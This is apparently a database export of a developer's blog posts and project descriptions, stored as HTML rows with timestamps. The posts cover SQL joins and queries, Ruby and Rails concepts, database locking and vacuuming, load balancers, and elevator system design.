19	2021-08-09 20:15:48.782072	2021-08-09 20:16:46.086449
25	body	<div><action-text-attachment content-type="image" url="https://lh5.googleusercontent.com/rXUrZ4bju2X5V0JKKhct2ifE0LMrU7ocj5uD9Ys-KQoYQq4gecl-o5P840fI-gcCRtW1DLcB9oBJn8UjqPJgOk8qthxEAlkN4DOPFg0bclvzSVVcZEfZ42dOa-yJ2olq1dEbqm_9" width="680" height="128"></action-text-attachment></div><ul>\n<li>(INNER) JOIN: Returns records that have matching values in both tables</li>\n<li>LEFT (OUTER) JOIN: Returns all records from the left table, and the matched records from the right table</li>\n<li>RIGHT (OUTER) JOIN: Returns all records from the right table, and the matched records from the left table</li>\n<li>FULL (OUTER) JOIN: Returns all records when there is a match in either left or right table<br><br>\n</li>\n</ul>	Post	20	2021-08-09 20:18:37.315043	2021-08-09 20:18:37.315043
28	description	<div>Application for Fan Engagement &amp; Content Distribution.<br><br><strong>Tech Stack</strong>: ROR, Heroku, REDIS, Sidekiq, Postgres, Cloudflare.<br><br><strong>Contributions</strong></div><ul><li>Build features for Application for Fan Engagement &amp; Content Distribution SAAS using ruby, javascript, Sidekiq, Heroku.</li><li>Enhanced load time for pages by API and image optimizations.</li><li>Improved SEO by building sitemaps dynamically, adding meta sections for posts.</li><li>Discover vulnerabilities in a web application and fix them.</li></ul>	Project	3	2021-08-10 18:47:38.890375	2021-08-10 18:47:38.890375
29	description	<div>Rental Platform based on sharetribe. Request booking, booking approval, exchange messages and more<br><br><strong>Tech Stack</strong>: Ruby on Rails, React.js, Sharetribe listing framework, sphinx search<br><br><strong>Features worked on:</strong></div><ul><li>Transaction History</li><li>Profanity filter</li><li>Add listing page</li><li>Admin Section</li><li>User dashboard</li><li>wishlist, search and filters</li></ul>	Project	4	2021-08-10 18:50:27.734036	2021-08-10 18:50:27.734036
26	body	<div>This is how we can find the nth highest salary in SQL SERVER using <strong>TOP</strong> keyword:</div><pre class="language-sql">SELECT TOP 1 salary FROM \r\n( SELECT DISTINCT TOP N salary FROM Employee ORDER BY salary DESC ) \r\nAS temp ORDER BY salary</pre><div><br></div><div>This is how we can find the nth highest salary in MYSQL using <strong>LIMIT</strong> keyword:</div><div><br></div><pre class="language-sql">SELECT salary FROM Employee ORDER BY salary DESC LIMIT N-1, 1</pre>	Post	21	2021-08-09 20:20:23.078092	2021-08-09 21:08:27.59493
27	body	<div>When javascript comes across a variable, it starts looking for its declaration in the current scope(function). If it finds it, it uses it. If not, then it looks for the outer scope. And it follows the same for that scope. This goes on till it hits the global scope. If it finds it in the global scope, it uses it. Otherwise, it creates a variable attached to the global scope.</div>	Post	22	2021-08-09 21:57:23.934547	2021-08-09 21:57:23.934547
30	body	<div>Available since Ruby 2. It actually works like an include, except that <strong>instead of inserting the module between the class and its superclass</strong> in the chain, it will<strong> insert it at the bottom of the chain, even before the class itself</strong>.</div><div>What it means is that when calling a method on a class instance, Ruby will look into the module methods before looking into the class.</div><pre class="language-rb">module ServiceDebugger  \r\n  def run(args)\r\n  end\r\nend\r\n\r\nclass Service  \r\n  prepend ServiceDebugger\r\n\r\n  # perform some real work\r\n  def run(args)\r\n  end\r\nend </pre><div><br></div><pre class="language-rb">Service.ancestors =&gt; [ServiceDebugger, Service, Object, ...]</pre>	Post	23	2021-08-10 21:33:38.24554	2021-08-10 21:34:10.504942
31	body	<div>When you call super with no arguments, Ruby sends a message to the parent of the current object, asking it to i<strong>nvoke a method with the same name as where you called super from</strong>, <strong>along with the arguments that were passed to that method</strong>.</div><div>On the other hand, when called with <strong>super(), it sends no arguments to the parent.</strong>\n</div><div>If the arguments you have don't match what the parent is expecting, then I would say you would want to use super(), or explicitly list parameters in the function call to match a valid parent constructor.</div>	Post	24	2021-08-10 21:35:24.400004	2021-08-10 21:35:24.400004
32	body	<div>1. When used in a function argument, it will <strong>collect all the remaining argument</strong>s in an array.</div><pre class="language-rb">def print_stuff(stuff, *arguments)\r\n  p stuff\r\n  arguments.each { |arg| p arg}\r\nend\r\n\r\nprint_stuff('yes', 'no', 'maybe', 'what?')</pre><div><br></div><div># =&gt; "yes" # =&gt; "no" # =&gt; "maybe" # =&gt; "what?"</div><div><br></div><div>2. <strong>Convert an array to arguments :</strong>\n</div><pre class="language-rb">def add(a, b, c)\r\n  p a + b + c\r\nend\r\n\r\nadd(*[1, 2, 3])\r\n\r\n# =&gt; 6</pre><div><br></div><div>3. <strong>Create an array</strong>\n</div><pre class="language-rb">stuff = *'Test'\r\np stuff\r\n\r\n# =&gt; ["Test"]</pre><div><br></div><div>4. <strong>Convert a hash to an array </strong>:</div><pre class="language-rb">stuff = *{ a: 1, b: 2, c:3 }\r\np stuff\r\n\r\n# =&gt; [[:a, 1], [:b, 2], [:c, 3]]</pre><div>5. <strong>Assign multiple variables :</strong>\n</div><pre class="language-rb"># You can also put it on the b variable\r\n*a, b = [1, 2, 3, 4, 5]\r\np a\r\np b\r\n\r\n# =&gt; [1, 2, 3, 4]\r\n# =&gt; 5</pre><div><br></div><div>6. <strong>Flatten an array</strong>\n</div><pre class="language-rb"># You can also put it on the b variable\r\n*a, b = [1, 2, 3, 4, 5]\r\np a\r\np b\r\n\r\n# =&gt; [1, 2, 3, 4]\r\n# =&gt; 5</pre>	Post	25	2021-08-10 21:37:21.276849	2021-08-10 21:38:53.188446
33	body	<div>STI lets you save <strong>different models inheriting from the same model</strong> inside a single table.</div><div>For example, let’s say you have an employee model. The employees can be of two types: manager or developer. They pretty much share the same attributes and columns. However, their behaviour should be different. Creating two tables having the exact same fields would be bad.</div><div>With STI, you can just keep your employee model and simply subclass it with your two types of employee. </div><div>STI should be used if your submodels will share the <strong>same attributes but need different behaviour.</strong> If you plan to add 10 columns only used by one submodel, using different tables might be a better solution.</div><div><br></div><div>Active Record allows inheritance by storing the name of the class in a column that by default is named “<strong>type</strong>” (can be changed by overwriting Base.inheritance_column). This means that an inheritance looking like this:<br><br>\n</div><pre class="language-rb">class Company &lt; ActiveRecord::Base; end\r\nclass Firm &lt; Company; end\r\nclass Client &lt; Company; end\r\nclass PriorityClient &lt; Client; end</pre><div>\n<br>When you do Firm.create(name: "37signals"), this record will be saved in the companies table with type = “Firm”. You can then fetch this row again using Company.where(name: '37signals').first and it will return a Firm object.</div><div><br></div><div>If you don't have a type column defined in your table, single-table inheritance won't be triggered. In that case, it'll work just like normal subclasses with no special magic for differentiating between them or reloading the right type with find.</div><div><br></div>	Post	26	2021-08-11 08:35:41.154312	2021-08-11 08:35:56.531916
35	body	<div>Use this macro in your model to set a default <a href="https://apidock.com/rails/ActiveRecord/Base/scope/class">scope</a> for <a href="https://apidock.com/rails/ActiveRecord/Base/all/class">all</a> operations on the model.</div><pre class="language-rb">class Article &lt; ActiveRecord::Base\r\n  default_scope where(:published =&gt; true)\r\nend\r\n\r\nArticle.all # =&gt; SELECT * FROM articles WHERE published = true</pre><div><br></div><div>The <strong>default_scope is also applied while creating/building a record.</strong> It is not applied while updating a record.</div><pre class="language-rb">Article.new.published    # =&gt; true\r\nArticle.create.published # =&gt; true</pre><div><br></div><div>If you use <strong>multiple default_scope declarations</strong> in your model then they will be <strong>merged</strong> together:</div><pre class="language-rb">class Article &lt; ActiveRecord::Base\r\n  default_scope where(:published =&gt; true)\r\n  default_scope where(:rating =&gt; 'G')\r\nend\r\n\r\nArticle.all # =&gt; SELECT * FROM articles WHERE published = true AND rating = 'G'</pre><div><br></div><div>\n<strong>To negate default scope </strong>or if you don't want to use default scope,</div><pre class="language-rb">Ticket.unscoped.all</pre>	Post	28	2021-08-11 08:42:17.49683	2021-08-11 08:42:23.886357
36	body	<pre class="language-rb">class WelcomeMailer &lt; ApplicationMailer\r\n  def welcome(user)\r\n    @user = user\r\n    mail to: user.email\r\n  end\r\nend\r\n\r\nWelcomeMailer.welcome(user).deliver_now</pre><div>It’s handled with <strong>method_missing magic in ActionMailer::Base</strong>. It returns an instance of MessageDelivery. Which initiates the mailer class and calls the instance method.</div><div><br></div>	Post	29	2021-08-11 08:44:25.414479	2021-08-11 08:44:30.533954
37	body	<div><action-text-attachment content-type="image" url="https://lh3.googleusercontent.com/BFfsuiemwRnwxSTJIC9XofbMHkzD8ZTQhQ0yB77sCU3Tu2o4wf8xkqDExGuC2A0RDmpxhpo-vMN1OUgyye359-EWIek0Kh63xTu7M3Bqz2sSfIVMq9zNPuYPZ2hKF_OUnd5ztpS7" width="494" height="280"></action-text-attachment></div><ol>\n<li>The user opens their browser and enters a URL.</li>\n<li>The browser sends a GET request to the URL. The request hits the Rails Router (config/routes.rb).</li>\n<li>The router receives the request information from the web server and based on that, decides which controller action should be called. If a request matches any path in the routes file, the corresponding controller and action will be called.</li>\n<li>The controller receives the parameters from the router and passes them into appropriate model methods.</li>\n<li>The model queries a database to fetch data.</li>\n<li>The Database returns stored data to the model.</li>\n<li>The model manages the data and returns it to the controller.</li>\n<li>The controller feeds the received data to the view.</li>\n<li>The view renders the page as HTML, prepares a response and forwards it to the controller.</li>\n<li>The controller forwards the ready response to the browser.</li>\n<li>The browser displays a response to the user.</li>\n</ol>	Post	30	2021-08-11 08:46:51.746856	2021-08-11 08:46:51.746856
34	body	<div>ActiveRecord Scope <strong>Adds a class method </strong>for retrieving and querying objects. The method is intended to return an ActiveRecord::Relation object, which is composable with other scopes. If it returns nil or false, an all scope is returned instead. A scope represents a narrowing of a database query</div><div>class Article &lt; ActiveRecord::Base <br>  scope :published, -&gt; { where(published: true) } <br>end</div><div>This is exactly the same as defining a class method, and which you use is a matter of personal preference:</div><pre class="language-rb">class Article &lt; ActiveRecord::Base \r\n  def self.published \r\n    where(published: true) \r\n  end \r\nend</pre><div><strong>Scopes are always chainable</strong></div><pre class="language-rb">class Post &lt; ActiveRecord::Base\r\n  scope :by_status, -&gt; status { where(status: status) }\r\n  scope :recent, -&gt; { order("posts.updated_at DESC") }\r\nend\r\nPost.by_status('published').recent\r\n# SELECT "posts".* FROM "posts" WHERE "posts"."status" = 'published' \r\n#   ORDER BY posts.updated_at DESC</pre><div><br></div><div><strong>But now what happens if the :status parameter is nil or blank?</strong></div><div>The difference is that a <strong>scope will always return a relation</strong>, whereas our simple class method implementation will not.</div><div><br></div><div><strong>When should you use a class method instead of a scope?</strong></div><div>Use scopes when the logic is very small, for simple where/order clauses, and class methods when it involves a bit more complexity, but whether it receives an argument or not doesn't.</div><div>When your scope logic gets complicated, a class method feels like the right place to put it.</div><div>Inside a class method, you can easily mix Ruby code with database code.</div><div><br></div>	Post	27	2021-08-11 08:39:34.419057	2021-08-11 08:40:06.925297
38	body	<div>We use locks to <strong>protect data integrity and atomicity</strong> in <strong>concurrent</strong> <strong>applications</strong> where a record could get read/write requests.</div><div>Imagine a case where multiple users want to purchase an item where there’s only 1 left in the stock. To prevent overselling, we will use Locks.</div><div><br></div><div><action-text-attachment content-type="image" url="https://lh4.googleusercontent.com/w-7mW0HuhEreXKTh-Oz-H-mGqlEtDJUIV8g9NqQniGHV7wzqrVv1hv8AEei4W-1yVOkqF6RjZyRUlEoHaFU_B92kSyGaFZIG5fKK0NZTKmkMKTbz2rz4YrMQJ8VBi_EshBHDf9tP" width="483" height="332"></action-text-attachment></div><div>\n<strong><br>Pessimistic Lock<br></strong><br><br>\n</div><div>Pessimistic Lock is where you assume that all the users are trying to access the same record and it literally <strong>locks the record exclusively for the first started transaction</strong> until it is completed successfully or failed</div><div>Pessimistic Lock provides <strong>better integrity</strong> on the data however <strong>management of the lock is harder</strong> and if you fail to manage that, your application may encounter <strong>deadlocks</strong>.</div><ol>\n<li>In our case, if we apply Pessimistic Lock, the first user to come and buy the last item in the stock will click on “Purchase”.</li>\n<li>This will lock the object until the payment is completed or failed.</li>\n<li>Let’s say User A was able to pay for it and the stock value for that item is set to 0 now.</li>\n<li>All the other users have to wait during this process.</li>\n<li>Now all the other users will see that the item went out of stocks, and cannot do anything with the item.</li>\n</ol><div>\n<strong><br>Optimistic Lock<br></strong><br><br>\n</div><div>Optimistic Lock is where you m<strong>anage your data by checking a special value in the database</strong> — it is often a <strong>version number,</strong> <strong>timestamp</strong>, date, etc.— before you read/write to the data to make sure that the data you are dealing with is not stale/old/changed since you’ve last viewed. If the data is stale, the transaction is not completed successfully and an error is thrown to indicate that. Something like: “The record you attempted to edit was modified by another user after you got the original value”.</div><ol>\n<li>In our case, if we apply Optimistic Lock, the first user to come and buy the last item in the stock will click on “Purchase”.</li>\n<li>Let’s say User A was able to pay for it and before the payment step the stock value is checked before committing to change it from 1 to 0.</li>\n<li>If the version numbers match the operation is committed and the item goes out of stock.</li>\n<li>Now all the other users that try to purchase that item will be warned about that the item is no longer available, right at the moment they try to buy, pay or add it to their baskets.</li>\n</ol>	Post	31	2021-08-11 08:48:46.057305	2021-08-11 08:49:01.255502
39	body	<div>Higher offsets slow the query down, since the query needs to count off the first OFFSET + LIMIT records (and take only LIMIT of them). The higher is this value, the longer the query runs.</div><div>So</div><pre class="language-sql">SELECT * FROM large ORDER BY `id`  LIMIT 0, 30</pre><div>takes far less time than</div><pre class="language-sql">SELECT * FROM large ORDER BY `id` LIMIT 10000, 30</pre>	Post	32	2021-08-11 08:50:19.948905	2021-08-11 08:50:19.948905
40	body	<div>When we delete a record, it is not physically deleted from memory immediately. Internally it is marked as deleted. Every row has a min to max lifespan.  In case of an update, Postgres creates a new row and marks the old one for deletion. </div><div><br></div><div>Some transactions might need to read deleted rows.</div><div>The physical deletion of the row is done by the auto vacuum process, which runs whenever it reaches some dead-rows-per-table threshold. </div><div>Though values are cleared but memory is not released. So in that case we need to do a full vacuum. This is expensive.</div><div><br></div>	Post	33	2021-08-11 08:51:03.442937	2021-08-11 08:51:03.442937
41	body	<div>A window function performs a <strong>Data Analysis calculation</strong> across a set of<strong> table rows that are somehow related to the current row</strong>. Window function does not cause rows to become grouped into a single output row. Rows retain their separate identities and are also able to access more than just the current row of the query result.</div><div>Similar to an aggregate function, a window function operates on a set of rows. However, it does not reduce the number of rows returned by the query.</div><div>The term window describes the set of rows on which the window function operates. A window function returns values from the rows in a window. </div><div><br></div><div><strong>Window Function Syntax:</strong></div><pre class="language-sql">Window_Function([All] expression)\r\nOVER( [PARTITION BY expression_list] [ORDER BY order_list Row_or_ Range clause] )</pre><div><br></div>	Post	34	2021-08-11 08:52:40.036849	2021-08-11 08:52:40.036849
42	body	<div>Load Balancer (LB) is the critical component of any distributed system. It helps to spread the traffic across a cluster of servers to improve responsiveness and availability of applications, websites or databases. LB also keeps track of the status of all the resources while distributing requests. If a server is not available to take new requests or is not responding or has a high error rate, LB will stop sending traffic to such a server.</div><div><action-text-attachment content-type="image" url="https://lh3.googleusercontent.com/pnJ7bWpnLSVHMQ4VcoyIi0vu3Cme2qHlH_E05dZliaapba1y8nrP7iADn7kDM2VjGklnhTimsFNTHItWEpXq129FGOZWHYvRp7toMFohvxcFJuidJy7rZQeseL71FyVKtXyn7I-y" width="680" height="128"></action-text-attachment></div><div>To utilize full scalability and redundancy, we can try to balance the load at each layer of the system. We can add LBs at three places:</div><ul>\n<li>Between the user and the webserver</li>\n<li>Between web servers and an internal platform layer, like application servers or cache servers</li>\n<li>Between the internal platform layer and database.</li>\n</ul><div><br></div><div>\n<strong>Load Balancing algorithms<br></strong><br>\n</div><ul>\n<li>\n<strong>Least Connection</strong>— This method directs traffic to the server with the fewest active connections. This approach is quite useful when there are a large number of persistent client connections which are unevenly distributed between the servers.</li>\n<li>\n<strong>Least Response Time</strong>— This algorithm directs traffic to the server with the fewest active connections and the lowest average response time.</li>\n<li>\n<strong>Least Bandwidth</strong>- This method selects the server that is currently serving the least amount of traffic measured in megabits per second (Mbps).</li>\n<li>\n<strong>Round Robin</strong>— This method cycles through a list of servers and sends each new request to the next server. When it reaches the end of the list, it starts over at the beginning. It is most useful when the servers are of equal specification and there are not many persistent connections.</li>\n<li>\n<strong>Weighted Round Robin</strong>— The weighted round-robin scheduling is designed to better handle <strong>servers with different processing capacities</strong>. Each server is assigned a weight (an integer value that indicates the processing capacity). Servers with higher weights receive new connections before those with fewer weights and servers with higher weights get more connections than those with fewer weights.</li>\n<li>\n<strong>IP Hash</strong> — Under this method, a hash of the IP address of the client is calculated to redirect the request to a server.</li>\n</ul><div><br></div><div><strong>Redundant Load Balancers</strong></div><div>The load balancer can be a single point of failure; to overcome this, a second load balancer can be connected to the first to form a cluster. Each LB monitors the health of the other and, since both of them are equally capable of serving traffic and failure detection, in the event the main load balancer fails, the second load balancer takes over.</div><div><action-text-attachment content-type="image" url="https://lh3.googleusercontent.com/d68Hpa-_11ttDBbyiR0X2WfRQvjV9n0xaGM1WQgcEJRUoBseiDSrItOba9o2M1IONyIxIHhA_ktd9ETLZQOjCJV7A3MsL87DL2tK6nswPJ-gooN4SlBuOV1AOZShz_DVNiEGf-a9" width="491" height="228"></action-text-attachment></div><div><br></div>	Post	35	2021-08-11 08:53:57.47535	2021-08-11 08:53:57.47535
43	body	<div><strong>Layer4 Load Balancers</strong></div><div><br></div><div><action-text-attachment content-type="image" url="https://lh4.googleusercontent.com/4mafc58FHVvq3HEOcILISTi-Wul58HxmgW6B9U3FbH7eAtvvxLbUTFjfm3GfmOAIfkHeKyIQ6fUC-_XzqZJ0FbtZMN0vflhVYAw3ltUg1W4uBP_9TvP92BZ7G15WmZKIGePCrZsj" width="472" height="208"></action-text-attachment></div><div><br></div><div>L4 as the name suggests works on <strong>Layer4</strong> (and Layer3) of the <strong>OSI</strong> <strong>model</strong>. When a client makes a request, it creates a TCP connection with the load balancer. The Load Balancer then uses the <strong>same TCP connection </strong>that the client created with it, to connect with one of the upstream servers.</div><div><br></div><div><action-text-attachment content-type="image" url="https://lh6.googleusercontent.com/qJ2muUTkJqqHApmuwkKCHaXgXK6kVJRyhEUChXy-CWh_gmi8c4xgkwnkwm9dWiknFNO57_-U7ROPd1xXUCRYRfmvFCm4LyNqoMOcgCJxg1jimHa5w4VY3AJ8ukd02LUS3PHBr0LI" width="481" height="101"></action-text-attachment></div><div>Transport layer adds a source and destination port. <strong>Network layer adds source and destination IP</strong> However, there is a difference. The source and destination IP of each packet is changed by the load balancer using <strong>NAT</strong> (Network address translation).</div><div>Source                 Dest         Source              Dest<br>----------- ---------- -------        ------- --------  --------<br>| Client IP | Segment  | LB IP |  --&gt; | LB IP | Segment | Server | <br>----------- ---------- -------        ------- --------  --------</div><div><strong>   Changing source and destination IP for every request packet</strong></div><div>When a response is received from the server, the same translation is performed again at the load balancer.</div><div>Source                 Dest         Source              Dest<br>----------- ---------- -------        ------- --------  ---------<br>| Server IP | Segment  | LB IP |  --&gt; | LB IP | Segment | ClientIP | <br>----------- ---------- -------        ------- --------  ---------</div><div><strong>   Changing source and destination IP for every response packet</strong></div><div><br></div><div>When using L4 load balancers, we are <strong>unaware of the data</strong>. This means we <strong>cannot make any decisions</strong> based on the data in our request. The only thing we have is IPs (source and destination)and ports.</div><div>Consider the following request</div><div>curl -X GET http://apis.pay.com/v1/payments/${paymentId} -H 'Authorization:Basic fdklakglkadskl='</div><div>Let’s say you want to return 401 in case the Authorization header is empty or you want to route the call to a service based on the path. With L4 load balancers, this is not possible as you don’t have access to the request data.</div><div><br></div><div><action-text-attachment content-type="image" url="https://lh3.googleusercontent.com/3eDi_UZK62HrjZc7VtSF-YDWZw5o5b2cy22x1jJ4WA_ZtWeZWJzc8dBCI4f1gZT5aQN6e0-WcNzdwLnKywW4RhLy14rJmwCUgyTLFATUabb4k67tORBKuRHOZH_QDG5ll6e1eO9c" width="583" height="303"></action-text-attachment></div><div><strong>Keep-Alive connection</strong></div><div>Also, load balancing multiplexing (HTTP2 streams), the kept-alive protocol is an issue. (Multiplexing is sending multiple requests over a single connection, and kept-alive is not closing the connection for some time). Consider a case where two clients A and B make a request to a load balancer with two upstream servers C and D(assume keep alive connection). Let’s say A is connected to server C and B is connected to server D. If A makes 1 RPS and B makes 50 RPS then D is handling 50x more requests than server C which is actually defeating the purpose of load balancing.</div><div><strong>Cons</strong></div><ol>\n<li>No smart load balancing</li>\n<li>Doesn’t work with streaming/keep-alive connections</li>\n<li>\n<strong>No TLS termination</strong> (Good or Bad you decide!)</li>\n</ol><div>L4 load balancers are not actually L4, they are a combination of L3 and L4 so you can actually call them L3/L4 Load balancers.</div><div><br></div><div><strong>Layer7 Load Balancers</strong></div><div><action-text-attachment content-type="image" url="https://lh4.googleusercontent.com/rTShhDfNjjmLdDuDSeVcet6Gx6uyUs21YA_1pKfv4Phap7GyInjmPBBEBHNX20CryCk--Vj8_OZ9KIChlyLJ9MmKDSdTNv1ZwPLNJam6piKq_Yz-cs8FIoT__y0xa9MotJOJ0Zlg" width="416" height="227"></action-text-attachment></div><div>L7 as the name suggests works on Layer7 (Layer6 and Layer5) of the OSI model. When a client makes a request, it creates a TCP connection with the load balancer. The Load Balancer then creates a new TCP connection with one of the upstream servers. Thus, there are <strong>2 TCP connections</strong> as compared to 1 in a TCP/UDP passthrough L4 Load balancer.</div><div>Since we are at layer7, we are <strong>aware of the data</strong> in our request. This allows us to perform a variety of operations like</div><ol>\n<li>\n<strong>Authentication</strong> — 401 if some header is not present</li>\n<li>\n<strong>Smart Routing</strong> — Route /payments call to a particular upstream</li>\n<li>TLS termination</li>\n</ol><div>In the case of multiplexed/keep-alive protocols, L7 load balancers work like a charm. L7 load balancer creates a TCP connection with every upstream for a single client connection rather than choosing a single upstream. This means when A creates a connection with the load balancer, the load balancer creates two connections one with C and one with D.</div><div><br></div><div><action-text-attachment content-type="image" url="https://lh4.googleusercontent.com/av5aELISfftUU-_OckhkhooRaoMstBZZL2QlrI5IBNRpDEXtTQ1BtIJk1Wbac2ZxI0uMBu3U82xpmmZSl2pWpUlzkjiZpI7PFUXstHiZmXWSjZg29KzubWrSlVbNgMPeCu0eC7MJ" width="646" height="301"></action-text-attachment></div>	Post	36	2021-08-11 08:54:48.579358	2021-08-11 08:54:48.579358
44	body	<div><strong>Requirements </strong></div><div><br></div><ol>\n<li>An elevator can move <strong>up</strong>, <strong>down</strong> or <strong>idle</strong>.</li>\n<li>An elevator can transfer passengers from one floor in a building to another floor in the minimum time possible.</li>\n<li>The elevator door can only open when it is a standstill on a floor (i.e. not moving).</li>\n<li>Number of Floors: The tallest building in the world is Burj Khalifa and it has around 163 floors. Let’s just assume that our system has 200 floors, which is still far greater than what the tallest building has. When we are gathering requirements, we need to make sure that we are still collecting some reasonable requirements.</li>\n<li>Burj Khalifa has around 57 elevators. We can assume in our system we have around 100 elevators.</li>\n<li>Other requirements<ol>\n<li>Number of passengers / Load on the elevator</li>\n<li>Moving speed of the elevator</li>\n</ol>\n</li>\n<li>what we would like to minimize.<ol>\n<li>minimize the wait time of the passengers?</li>\n<li>Or do we like to minimize the overall wait time in the system?</li>\n</ol>\n</li>\n<li>You should also discuss with the interviewer whether he would like to have different operational zones or sectors in the elevator system. A zone is a set of floors that are covered by a set of elevators. E.g.</li>\n</ol><div>In our case of 200 floors and 100 elevators, we can, e.g., divide all the floors into 4 zones:</div><div>· From 1–50: operated by 25 elevators</div><div>· From 51–100: operated by 25 elevators</div><div>· From 101–150: operated by 25 elevators</div><div>· From 151–200: operated by 25 elevators</div><div>Another way of zoning is to divide all floors into two zones (even and odd floors, etc.)</div><div><br></div><div>When we use multiple zones in a building along with a set of elevators assigned to a zone then we can treat each zone independently from each other.</div><div>If we use the first approach of 4 zones then our elevator design problem then boils down to 50 floors and 25 elevators. On the other hand, if we use the second approach of 2 zones (i.e. odd/even zones), our elevator design problem boils down to 100 floors and 50 elevators. If we need to decide whether to use a zone or not and if yes then which zoning approach to use, it all depends on the waiting time requirements and speed of the elevators.</div><div><br></div><ol><li>Apart from the above requirements, there are some extended requirements like:<ol>\n<li>Triggering emergency alarm/brake</li>\n<li>VIP or utility elevators</li>\n</ol>\n</li></ol><div><br></div><div><strong>Object and Actors:</strong></div><div>These objects and actors help us to identify the classes and interfaces that we need to implement an elevator system. In an elevator system, you can easily find the following objects.</div><div>1. Passenger</div><div>2. The elevator controller</div><div>3. Elevators</div><div>4. Then each elevator can have doors, button panels inside the elevators, and then buttons</div><div>5. Floors</div><div>6. Monitoring System</div><div>and more.</div><div><br></div><div><strong>Do we need a Passenger class?</strong></div><div>We are making an elevator design, not an elevator simulator. A passenger is just an actor. A Passenger will just call the elevator system.</div><div><br></div><div><strong>Use Cases</strong></div><div>After identifying the classes and interfaces and the relation between them, it is also important to discuss different use-cases. The most important use-cases include:</div><ul>\n<li>\n<strong>Calling Elevator Car</strong>: So, when a passenger wants to go up or down to a different floor he presses the up or down button to call the elevator. This requires scheduling an elevator car to go to the passenger floor.</li>\n<li>Move/Stop the Elevator</li>\n<li>Open/Close the doors</li>\n<li>Indicating moving direction</li>\n<li>Indicating elevator position: the floor where the elevator has reached. This is important to indicate to the passenger so that the passenger can get off the elevator at his destination floor</li>\n<li>Triggering Emergency Breaks</li>\n<li>Making an Emergency call</li>\n</ul><div><br></div><div><strong>Interfaces</strong></div><div><br></div><div><action-text-attachment content-type="image" url="https://lh3.googleusercontent.com/cEcYXIu7dU8H6oP-kiOpTQvCLTzwMt6vQeHuku2o26MtM22bIoOb1RmVFmQFkUOBznHAe1XGYs_ia2Vv1h-ye4aWmQqTQFXzJ8zEKXQBHFsYaGSrnwgFhr8syrc6uRDC7reEwXkE" width="401" height="231"></action-text-attachment></div><div>Why do we need 2 Types of Buttons?</div><div>Hall Buttons are outside the elevator (up and down button), Elevator Buttons are inside the elevator. Both buttons have different type of operations</div><div><br></div><div><action-text-attachment content-type="image" url="https://lh4.googleusercontent.com/uTPDxQerYj4-QUJNdh_IWdDtgb5Z60e3-j8_a34bmRtar0nmL94c8k9HDKeyPzVGW7HOVi-h0sbJJOtFdm44NhCupimjrFZUev8cjmwXFSV8A2b86qVl6uJR8Hy9947Ro4xiF9D0" width="141" height="91"></action-text-attachment></div><div> We will have as many instances of Door class as the number of floors X number of elevators</div><div><br></div><div><action-text-attachment content-type="image" url="https://lh5.googleusercontent.com/OtKslrZVtpo70ROW0ystws8xGfBuo14Y6WU94huJhJdr6r1TuDgpQ-eFoQ70OMUYo6n5m917GvGWM3iNT_KCOP0BjDwNaK4SkE-1z8ulJPOQekPab8Ank_oj5SnBRQ5C9p58_L86" width="171" height="91"></action-text-attachment></div><div>Sly we will have interfaces for Floor, Dispatcher, Monitoring System, etc.</div><div>\n<br><br>\n</div><div><strong>Scheduling Algorithm</strong></div><ul>\n<li>First Come First Serve (FCFS)</li>\n<li>Shortest Seek Time First (SSTF)</li>\n<li>SCAN</li>\n<li>LOOK</li>\n</ul><div><br></div><div><action-text-attachment content-type="image" url="https://lh3.googleusercontent.com/U4S6XwHCnV4VxRGFN_B8KJfGc1xu8RWKMW6BTP6SLJ3tCpHKiePl-qd9AFCXixcTriIGQl7Trxoub08Ps72MMnlpDme08tNNegwSZ1X71C4nRMm857NWeromcrb-R9y6_3gDxU_T" width="245" height="275"></action-text-attachment></div><div><br></div><div>Whenever a passenger presses a button, a request will go to the dispatcher and it will be stored in a queue.</div><div><br></div><div><strong>The different States of Elevator when a passenger presses Hall button</strong></div><ol>\n<li>Idle</li>\n<li>Elevator moving towards passenger and in the same direction in which passenger wants to go</li>\n<li>Elevator is moving in the same direction towards passenger but opposite to which passenger wants to go</li>\n<li>Elevator is moving away from the passenger</li>\n</ol><div><br></div><div><strong>FCFS</strong></div><div>Here requests will be served on a 1st come 1st serve basis. </div><div>The dispatcher will always try to find an elevator in the 1st or 2nd state.</div><div><br></div><div><strong>Drawbacks of FCFS</strong></div><ol>\n<li>\n<strong>Not serve multiple requests in parallel</strong>: If there is a passenger going from the ground floor to the top floor and another passenger presses up button from in between floors, In FCFS, the first elevator will go to the top floor then it will start serving other passengers. But ideally, it should have taken a 2nd passenger also along.</li>\n<li>There will be <strong>extra up and down</strong> motions of the elevator.</li>\n</ol><div><br></div><div><strong>Shortest Seek Time First</strong></div><div>This will favor the minimum movement of the elevator. </div><div>This can be implemented using <strong>priority queue </strong>or <strong>min heap</strong>, based upon the distance of requesting floor from elevator floor. But as the elevator moves, values will also change</div><div>Another approach can be we can store requesting floors in an array and every time we can search in the array.</div><div><br></div><div><strong>Drawbacks in SSTF</strong></div><ol>\n<li>\n<strong>Starvation:</strong> If a user is on a faraway floor, it will be ignored until nearby floors are served.</li>\n<li>This also doesn't serve multiple requests in parallel</li>\n</ol><div>\n<br><br>\n</div><div><strong>SCAN (Elevator Algorithm)</strong></div><ol>\n<li>Here we will have <strong>2 boolean arrays</strong>, one for <strong>UP</strong> direction and another for <strong>DOWN</strong> direction</li>\n<li>Each elevator car will move up or down and scan these arrays. The direction of the elevator will change only at the top floor or bottom floor. </li>\n<li>While a elevator is moving UP, it will check UP boolean array and if the entry in array is set, it will stop at the floor and reset the entry</li>\n<li>Also each elevator car has 2 priority queues. Min Heap and Max heap for going up and down. They check entries here as well. While going up, it will check the min heap. If the current floor is there at the top of the min heap, it will stop there and entry is removed. </li>\n</ol><div><br></div><div><strong>Drawbacks of SCAN</strong></div><div>Elevator cars are continuously moving.</div><div>Elevator car will only change direction at top or bottom which will waste time.</div><div>\n<br><br>\n</div><div><strong>LOOK</strong></div><div>Here the elevator will look ahead at each floor whether there are requests or not. Elevator will stop when there are no requests and at that point it can change the direction as well. </div><div>In the above diagram, If a person at 3 wants to go up. There are 2 elevators, one going up and another idle at 4. Which elevator should be dispatched?</div><div><br></div><div>Different approaches can be like Shortest seek time first</div><div><br></div><div>In reality, LOOK algo with some modifications are used. Modifications are based on heuristics. For example, if it's an office building, then in the morning we would like the elevator to always be in the lobby, so that it can take employees up.</div><div><br></div><div><strong>Destination Dispatch Algorithm</strong></div><div>In some of the elevator systems, Instead of up and down buttons, there is a panel where passengers can enter the destination floor. Then an appropriate elevator will be found and the user will be asked to go to that particular door number. </div><div>Here dispatch algo will try 